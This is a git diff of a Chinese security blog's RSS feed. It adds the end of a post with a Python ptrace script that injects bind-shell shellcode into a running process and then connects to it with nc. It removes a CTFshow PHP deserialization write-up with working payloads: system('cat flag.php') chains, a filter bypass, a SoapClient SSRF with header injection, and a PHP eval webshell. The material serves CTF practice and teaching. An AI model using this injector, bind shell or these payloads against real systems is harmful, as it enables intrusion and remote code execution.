+print(&amp;quot;Instruction Pointer: &amp;quot; + hex(registers.rip))
+
+print(&amp;quot;Injecting Shellcode at: &amp;quot; + hex(registers.rip))
+
+# Shell code copied from exploit db.
+shellcode=&amp;quot;\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05&amp;quot;
+
+# Inject the shellcode into the running process byte by byte.
+for i in xrange(0,len(shellcode),4):
+ 
+  # Convert the byte to little endian.
+  shellcode_byte_int=int(shellcode[i:4+i].encode(&#39;hex&#39;),16)
+  shellcode_byte_little_endian=struct.pack(&amp;quot;&amp;lt;I&amp;quot;, shellcode_byte_int).rstrip(&#39;\x00&#39;).encode(&#39;hex&#39;)
+  shellcode_byte=int(shellcode_byte_little_endian,16)
+ 
+  # Inject the byte.
+  libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)
+
+print(&amp;quot;Shellcode Injected!!&amp;quot;)
+
+# Modify the instuction pointer
+registers.rip=registers.rip+2
+
+# Set the registers
+libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
+
+print(&amp;quot;Final Instruction Pointer: &amp;quot; + hex(registers.rip))
+
+# Detach from the process.
+libc.ptrace(PTRACE_DETACH, pid, None, None)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;git clone https://gitee.com/Re1-zf/shell.git
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719134433363.png&#34; alt=&#34;image-20230719134433363&#34; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python2.7 inject.py 902
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719134533090.png&#34; alt=&#34;image-20230719134533090&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;查看一下当前是不是已经开启了 5600 端口&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ss -pantu |grep 5600
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719134701291.png&#34; alt=&#34;image-20230719134701291&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;直接 nc 上去即可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719134737944.png&#34; alt=&#34;image-20230719134737944&#34; /&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://blog.xcu.icu/2023/07/18/EvilBox---One%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</guid>
             <title>EvilBox - One靶机打靶记录</title>
@@ -7018,805 +7367,6 @@ pickle.loads(payload)
 &lt;/table&gt;
 &lt;h4 id=&#34;拼接opcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#拼接opcode&#34;&gt;#&lt;/a&gt; 拼接 opcode&lt;/h4&gt;
 &lt;p&gt;将第一个 pickle 流结尾表示结束的。去掉，将第二个 pickle 流与第一个拼接起来即可。&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://blog.xcu.icu/2023/03/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
-            <title>CTFshow-web入门php反序列化</title>
-            <link>https://blog.xcu.icu/2023/03/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
-            <category term="CTFshow" scheme="https://blog.xcu.icu/categories/CTFshow/" />
-            <category term="php反序列化" scheme="https://blog.xcu.icu/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" />
-            <pubDate>Sun, 05 Mar 2023 12:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
-&lt;p&gt;本篇记录反序列化的学习，有关知识点可以看我的这篇文章&lt;a href=&#34;https://blog.xcu.icu/2022/11/02/php%E5%BA%8F%E5%88%97%E5%8C%96/&#34;&gt; php 反序列化 - Web | Clown の Blog = (xcu.icu)&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web254&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web254&#34;&gt;#&lt;/a&gt; web254&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-include(&#39;flag.php&#39;);
-
-class ctfShowUser&amp;#123;
-    public $username=&#39;xxxxxx&#39;;
-    public $password=&#39;xxxxxx&#39;;
-    public $isVip=false;
-
-    public function checkVip()&amp;#123;
-        return $this-&amp;gt;isVip;
-    &amp;#125;
-    public function login($u,$p)&amp;#123;
-        if($this-&amp;gt;username===$u&amp;amp;&amp;amp;$this-&amp;gt;password===$p)&amp;#123;
-            $this-&amp;gt;isVip=true;
-        &amp;#125;
-        return $this-&amp;gt;isVip;
-    &amp;#125;
-    public function vipOneKeyGetFlag()&amp;#123;
-        if($this-&amp;gt;isVip)&amp;#123;
-            global $flag;
-            echo &amp;quot;your flag is &amp;quot;.$flag;
-        &amp;#125;else&amp;#123;
-            echo &amp;quot;no vip, no flag&amp;quot;;
-        &amp;#125;
-    &amp;#125;
-&amp;#125;
-
-$username=$_GET[&#39;username&#39;];
-$password=$_GET[&#39;password&#39;];
-
-if(isset($username) &amp;amp;&amp;amp; isset($password))&amp;#123;
-    $user = new ctfShowUser();
-    if($user-&amp;gt;login($username,$password))&amp;#123;
-        if($user-&amp;gt;checkVip())&amp;#123;
-            $user-&amp;gt;vipOneKeyGetFlag();
-        &amp;#125;
-    &amp;#125;else&amp;#123;
-        echo &amp;quot;no vip,no flag&amp;quot;;
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这题 emmm 感觉不想是反序列化啊，就审计一下&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;?username=xxxxxx&amp;amp;password=xxxxxx
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301201449519.png&#34; alt=&#34;image-20230301201449519&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里简单说一下逻辑，先看下面，$username 和 $password 先接受 get 的参数，然后 if 判断差数是否存在，如果存在就实例化类 ctfshowUser，然后调用类中的 login 方法判断用户名和密码是否正确正确给 $isVip 赋值为 ture，接着调用 checkVip 函数检测上一步有没有通过（有点怪），最后调用 vipOneKeyGetFlag 函数输出 flag（因为后面的题是这个的改动，所以这个稍微写的详细一点）&lt;/p&gt;
-&lt;h2 id=&#34;web255&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web255&#34;&gt;#&lt;/a&gt; web255&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-include(&#39;flag.php&#39;);
-
-class ctfShowUser&amp;#123;
-    public $username=&#39;xxxxxx&#39;;
-    public $password=&#39;xxxxxx&#39;;
-    public $isVip=false;
-
-    public function checkVip()&amp;#123;
-        return $this-&amp;gt;isVip;
-    &amp;#125;
-    public function login($u,$p)&amp;#123;
-        return $this-&amp;gt;username===$u&amp;amp;&amp;amp;$this-&amp;gt;password===$p;
-    &amp;#125;
-    public function vipOneKeyGetFlag()&amp;#123;
-        if($this-&amp;gt;isVip)&amp;#123;
-            global $flag;
-            echo &amp;quot;your flag is &amp;quot;.$flag;
-        &amp;#125;else&amp;#123;
-            echo &amp;quot;no vip, no flag&amp;quot;;
-        &amp;#125;
-    &amp;#125;
-&amp;#125;
-
-$username=$_GET[&#39;username&#39;];
-$password=$_GET[&#39;password&#39;];
-
-if(isset($username) &amp;amp;&amp;amp; isset($password))&amp;#123;
-    $user = unserialize($_COOKIE[&#39;user&#39;]);    
-    if($user-&amp;gt;login($username,$password))&amp;#123;
-        if($user-&amp;gt;checkVip())&amp;#123;
-            $user-&amp;gt;vipOneKeyGetFlag();
-        &amp;#125;
-    &amp;#125;else&amp;#123;
-        echo &amp;quot;no vip,no flag&amp;quot;;
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里多了一个 cookie 被反序列化很明显了，利用这个给 isvip 赋值就可以了&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-
-class ctfShowUser&amp;#123;
-    public $username=&#39;xxxxxx&#39;;
-    public $password=&#39;xxxxxx&#39;;
-    public $isVip=true;
-&amp;#125;
-$a = new ctfShowUser();
-echo urlencode(serialize($a));
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301203023324.png&#34; alt=&#34;image-20230301203023324&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web256&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web256&#34;&gt;#&lt;/a&gt; web256&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-include(&#39;flag.php&#39;);
-
-class ctfShowUser&amp;#123;
-    public $username=&#39;xxxxxx&#39;;
-    public $password=&#39;xxxxxx&#39;;
-    public $isVip=false;
-
-    public function checkVip()&amp;#123;
-        return $this-&amp;gt;isVip;
-    &amp;#125;
-    public function login($u,$p)&amp;#123;
-        return $this-&amp;gt;username===$u&amp;amp;&amp;amp;$this-&amp;gt;password===$p;
-    &amp;#125;
-    public function vipOneKeyGetFlag()&amp;#123;
-        if($this-&amp;gt;isVip)&amp;#123;
-            global $flag;
-            if($this-&amp;gt;username!==$this-&amp;gt;password)&amp;#123;
-                    echo &amp;quot;your flag is &amp;quot;.$flag;
-              &amp;#125;
-        &amp;#125;else&amp;#123;
-            echo &amp;quot;no vip, no flag&amp;quot;;
-        &amp;#125;
-    &amp;#125;
-&amp;#125;
-
-$username=$_GET[&#39;username&#39;];
-$password=$_GET[&#39;password&#39;];
-
-if(isset($username) &amp;amp;&amp;amp; isset($password))&amp;#123;
-    $user = unserialize($_COOKIE[&#39;user&#39;]);    
-    if($user-&amp;gt;login($username,$password))&amp;#123;
-        if($user-&amp;gt;checkVip())&amp;#123;
-            $user-&amp;gt;vipOneKeyGetFlag();
-        &amp;#125;
-    &amp;#125;else&amp;#123;
-        echo &amp;quot;no vip,no flag&amp;quot;;
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里有加上了一条 username 和 pasword 的不同&lt;/p&gt;
-&lt;p&gt;简单改一下上一题的 payload 就可以直接用&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-
-class ctfShowUser&amp;#123;
-    public $username=&#39;demo&#39;;
-    public $password=&#39;xxxxxx&#39;;
-    public $isVip=true;
-&amp;#125;
-$a = new ctfShowUser();
-echo urlencode(serialize($a));
-//O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22demo%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230302191137410.png&#34; alt=&#34;image-20230302191137410&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web257&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web257&#34;&gt;#&lt;/a&gt; web257&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-
-class ctfShowUser&amp;#123;
-    private $username=&#39;xxxxxx&#39;;
-    private $password=&#39;xxxxxx&#39;;
-    private $isVip=false;
-    private $class = &#39;info&#39;;
-
-    public function __construct()&amp;#123;
-        $this-&amp;gt;class=new info();
-    &amp;#125;
-    public function login($u,$p)&amp;#123;
-        return $this-&amp;gt;username===$u&amp;amp;&amp;amp;$this-&amp;gt;password===$p;
-    &amp;#125;
-    public function __destruct()&amp;#123;
-        $this-&amp;gt;class-&amp;gt;getInfo();
-    &amp;#125;
-
-&amp;#125;
-
-class info&amp;#123;
-    private $user=&#39;xxxxxx&#39;;
-    public function getInfo()&amp;#123;
-        return $this-&amp;gt;user;
-    &amp;#125;
-&amp;#125;
-
-class backDoor&amp;#123;
-    private $code;
-    public function getInfo()&amp;#123;
-        eval($this-&amp;gt;code);
-    &amp;#125;
-&amp;#125;
-
-$username=$_GET[&#39;username&#39;];
-$password=$_GET[&#39;password&#39;];
-
-if(isset($username) &amp;amp;&amp;amp; isset($password))&amp;#123;
-    $user = unserialize($_COOKIE[&#39;user&#39;]);
-    $user-&amp;gt;login($username,$password);
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里的利用思路是在 ctfShowUser 里有一个__destruct 的方法会在对象销毁的时候会自动调用函数 getInfo ()，而在 backDoor 类中也有这个方法，而且会执行 eval 函数，这里我们需要覆盖这个__construct 方法&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-class ctfShowUser&amp;#123;
-    public function __construct()&amp;#123;
-        $this-&amp;gt;class=new backDoor();
-    &amp;#125;
-&amp;#125;
-
-class backDoor&amp;#123;
-    private $code=&amp;quot;system(&#39;cat flag.php&#39;);&amp;quot;;
-&amp;#125;
-$a=new ctfShowUser();
-echo serialize($a);
-echo &amp;quot;\n&amp;quot;;
-echo urlencode(serialize($a));
-/*
-O:11:&amp;quot;ctfShowUser&amp;quot;:1:&amp;#123;s:5:&amp;quot;class&amp;quot;;O:8:&amp;quot;backDoor&amp;quot;:1:&amp;#123;s:14:&amp;quot; backDoor code&amp;quot;;s:23:&amp;quot;system(&#39;cat flag.php&#39;);&amp;quot;;&amp;#125;&amp;#125;
-O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D
-*/
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230302195845419.png&#34; alt=&#34;image-20230302195845419&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web258&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web258&#34;&gt;#&lt;/a&gt; web258&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-
-class ctfShowUser&amp;#123;
-    public $username=&#39;xxxxxx&#39;;
-    public $password=&#39;xxxxxx&#39;;
-    public $isVip=false;
-    public $class = &#39;info&#39;;
-
-    public function __construct()&amp;#123;
-        $this-&amp;gt;class=new info();
-    &amp;#125;
-    public function login($u,$p)&amp;#123;
-        return $this-&amp;gt;username===$u&amp;amp;&amp;amp;$this-&amp;gt;password===$p;
-    &amp;#125;
-    public function __destruct()&amp;#123;
-        $this-&amp;gt;class-&amp;gt;getInfo();
-    &amp;#125;
-
-&amp;#125;
-
-class info&amp;#123;
-    public $user=&#39;xxxxxx&#39;;
-    public function getInfo()&amp;#123;
-        return $this-&amp;gt;user;
-    &amp;#125;
-&amp;#125;
-
-class backDoor&amp;#123;
-    public $code;
-    public function getInfo()&amp;#123;
-        eval($this-&amp;gt;code);
-    &amp;#125;
-&amp;#125;
-
-$username=$_GET[&#39;username&#39;];
-$password=$_GET[&#39;password&#39;];
-
-if(isset($username) &amp;amp;&amp;amp; isset($password))&amp;#123;
-    if(!preg_match(&#39;/[oc]:\d+:/i&#39;, $_COOKIE[&#39;user&#39;]))&amp;#123;
-        $user = unserialize($_COOKIE[&#39;user&#39;]);
-    &amp;#125;
-    $user-&amp;gt;login($username,$password);
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这个题比起上面加上了过滤&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;/[oc]:\d+:/i`。意思是过滤这两种情况：`o:数字:`与`c:数字:
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;加上一个 + 绕过即可&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-class ctfShowUser&amp;#123;
-    public function __construct()&amp;#123;
-        $this-&amp;gt;class=new backDoor();
-    &amp;#125;
-&amp;#125;
-
-class backDoor&amp;#123;
-    public $code=&amp;quot;system(&#39;cat flag.php&#39;);&amp;quot;;
-&amp;#125;
-$a=new ctfShowUser();
-$a=serialize($a);
-//echo &amp;quot;\n&amp;quot;;
-$a = str_replace(&#39;O:&#39;,&#39;O:+&#39;,$a);
-//echo &amp;quot;\n&amp;quot;;
-echo urlencode($a);
-//O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230302203124133.png&#34; alt=&#34;image-20230302203124133&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web259-socapclient&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web259-socapclient&#34;&gt;#&lt;/a&gt; web259-SocapClient&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-
-highlight_file(__FILE__);
-
-
-$vip = unserialize($_GET[&#39;vip&#39;]);
-//vip can get flag one key
-$vip-&amp;gt;getFlag();
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里就一个反序列化，然后就调用 getflag 函数，可以想到是原生类的使用，__call () 函数，是当调用未知函数时自动触发，而在 SocapClient 原生类中会有 call 函数可以进行 SSRF&lt;/p&gt;
-&lt;p&gt;这里给的的 flag.php&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$xff = explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);
-array_pop($xff);
-$ip = array_pop($xff);
-
-
-if($ip!==&#39;127.0.0.1&#39;)&amp;#123;
-	die(&#39;error&#39;);
-&amp;#125;else&amp;#123;
-	$token = $_POST[&#39;token&#39;];
-	if($token==&#39;ctfshow&#39;)&amp;#123;
-		file_put_contents(&#39;flag.txt&#39;,$flag);
-	&amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里限制了 ip 为 127.0.0.1&lt;/p&gt;
-&lt;p&gt;$_SERVER [&#39;HTTP_X_FORWARDED_FOR&#39;] 要 array_pop 两次，取第二次的值赋值给 $IP,post 传入的 token 如果 ===ctfshow 就会把 $flag 的值写入 flag.txt 里面&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-$ua=&amp;quot;ctfshow\r\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&amp;quot;;
-$client=new SoapClient(null,array(&#39;uri&#39;=&amp;gt;&amp;quot;127.0.0.1/&amp;quot;,&#39;location&#39;=&amp;gt;&amp;quot;http://127.0.0.1/flag.php&amp;quot;,&#39;user_agent&#39;=&amp;gt;$ua));
-echo urlencode(serialize($client));
-//O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A132%3A%22kradress%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;访问 flag.txt 查看 flag&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230302221314104.png&#34; alt=&#34;image-20230302221314104&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web260&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web260&#34;&gt;#&lt;/a&gt; web260&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-
-error_reporting(0);
-highlight_file(__FILE__);
-include(&#39;flag.php&#39;);
-
-if(preg_match(&#39;/ctfshow_i_love_36D/&#39;,serialize($_GET[&#39;ctfshow&#39;])))&amp;#123;
-    echo $flag;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;看到题我还懵了一下，属实没想到，上一题还在 SSRF，下一题又随便传个参就过了&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304111406708.png&#34; alt=&#34;image-20230304111406708&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web261&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web261&#34;&gt;#&lt;/a&gt; web261&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-
-highlight_file(__FILE__);
-
-class ctfshowvip&amp;#123;
-    public $username;
-    public $password;
-    public $code;
-
-    public function __construct($u,$p)&amp;#123;
-        $this-&amp;gt;username=$u;
-        $this-&amp;gt;password=$p;
-    &amp;#125;
-    public function __wakeup()&amp;#123;
-        if($this-&amp;gt;username!=&#39;&#39; || $this-&amp;gt;password!=&#39;&#39;)&amp;#123;
-            die(&#39;error&#39;);
-        &amp;#125;
-    &amp;#125;
-    public function __invoke()&amp;#123;
-        eval($this-&amp;gt;code);
-    &amp;#125;
-
-    public function __sleep()&amp;#123;
-        $this-&amp;gt;username=&#39;&#39;;
-        $this-&amp;gt;password=&#39;&#39;;
-    &amp;#125;
-    public function __unserialize($data)&amp;#123;
-        $this-&amp;gt;username=$data[&#39;username&#39;];
-        $this-&amp;gt;password=$data[&#39;password&#39;];
-        $this-&amp;gt;code = $this-&amp;gt;username.$this-&amp;gt;password;
-    &amp;#125;
-    public function __destruct()&amp;#123;
-        if($this-&amp;gt;code==0x36d)&amp;#123;
-            file_put_contents($this-&amp;gt;username, $this-&amp;gt;password);
-        &amp;#125;
-    &amp;#125;
-&amp;#125;
-
-unserialize($_GET[&#39;vip&#39;]);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这一题稍微有点意思，但不多，首先简单说一下上面用到几个方法&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;__construct():构造函数，类实例化时自动调用
-__invoke():调用函数的方式调用一个对象时的回应方法
-__wakeu():反序列化后自动调用
-__sleep():序列化时会自动调用
- __unserialize():在unserialize函数执行前会先检查有无此函数，如果又，优先级最高
- __destruct():在类的一个对象被删除时自动调用
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;整个程序执行时，先进__unserialize 函数，但是在__unserialize 函数中没有能够进入__invoke 函数的方法，这里只能通过在对象被删除时制动调用__destruct 来写文件，故这里只需要满足 code 为 0x36d=877 即可&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-class ctfshowvip&amp;#123;
-    public $username=&amp;quot;877.php&amp;quot;;
-    public $password=&#39;&amp;lt;?php eval($_POST[1]);&#39;;
-    public $code=0x36d;
-&amp;#125;
-$a =new ctfshowvip();
-echo serialize($a).&amp;quot;\n&amp;quot;;
-echo urlencode(serialize($a));
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里写入一个文件，用蚁剑连接&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304115732681.png&#34; alt=&#34;image-20230304115732681&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web262&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web262&#34;&gt;#&lt;/a&gt; web262&lt;/h2&gt;
-&lt;p&gt;index.php&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt; &amp;lt;?php
-error_reporting(0);
-class message&amp;#123;
-    public $from;
-    public $msg;
-    public $to;
-    public $token=&#39;user&#39;;
-    public function __construct($f,$m,$t)&amp;#123;
-        $this-&amp;gt;from = $f;
-        $this-&amp;gt;msg = $m;
-        $this-&amp;gt;to = $t;
-    &amp;#125;
-&amp;#125;
-
-$f = $_GET[&#39;f&#39;];
-$m = $_GET[&#39;m&#39;];
-$t = $_GET[&#39;t&#39;];
-
-if(isset($f) &amp;amp;&amp;amp; isset($m) &amp;amp;&amp;amp; isset($t))&amp;#123;
-    $msg = new message($f,$m,$t);
-    $umsg = str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg));
-    setcookie(&#39;msg&#39;,base64_encode($umsg));
-    echo &#39;Your message has been sent&#39;;
-&amp;#125;
-
-highlight_file(__FILE__);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;message.php&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-include(&#39;flag.php&#39;);
-
-class message&amp;#123;
-    public $from;
-    public $msg;
-    public $to;
-    public $token=&#39;user&#39;;
-    public function __construct($f,$m,$t)&amp;#123;
-        $this-&amp;gt;from = $f;
-        $this-&amp;gt;msg = $m;
-        $this-&amp;gt;to = $t;
-    &amp;#125;
-&amp;#125;
-
-if(isset($_COOKIE[&#39;msg&#39;]))&amp;#123;
-    $msg = unserialize(base64_decode($_COOKIE[&#39;msg&#39;]));
-    if($msg-&amp;gt;token==&#39;admin&#39;)&amp;#123;
-        echo $flag;
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;有替换很明显，考察字符串逃逸，这里先简单说一下什么是字符串逃逸&lt;/p&gt;
-&lt;h3 id=&#34;反序列化字符串逃逸&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化字符串逃逸&#34;&gt;#&lt;/a&gt; 反序列化字符串逃逸&lt;/h3&gt;
-&lt;h4 id=&#34;增加&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#增加&#34;&gt;#&lt;/a&gt; 增加&lt;/h4&gt;
-&lt;p&gt;这个点在我上面的文章中没有说到，当时没想起来还有这个点，这个知识点也不麻烦，就简单的说明一下&lt;/p&gt;
-&lt;p&gt;php 序列化后的格式是固定的&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-class demo&amp;#123;
-    public $username = &amp;quot;admin&amp;quot;;
-    public $passwd=&amp;quot;test&amp;quot;;
-&amp;#125;
-$a = new demo();
-echo $b = serialize($a).&amp;quot;\n&amp;quot;;
-
-var_dump(unserialize($b));
-var_dump(unserialize(&amp;quot;O:4:\&amp;quot;demo\&amp;quot;:2:&amp;#123;s:8:\&amp;quot;username\&amp;quot;;s:5:\&amp;quot;admin\&amp;quot;;s:6:\&amp;quot;passwd\&amp;quot;;s:4:\&amp;quot;test\&amp;quot;;&amp;#125;aaaaaaaaaaaaaaaaaaaaaaaa&amp;quot;));
-var_dump(unserialize(&amp;quot;O:4:\&amp;quot;demo\&amp;quot;:2:&amp;#123;s:8:\&amp;quot;username123\&amp;quot;;s:5:\&amp;quot;admin\&amp;quot;;s:6:\&amp;quot;passwd\&amp;quot;;s:4:\&amp;quot;test\&amp;quot;;&amp;#125;&amp;quot;));
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304134324287.png&#34; alt=&#34;image-20230304134324287&#34; /&gt;&lt;/p&gt;
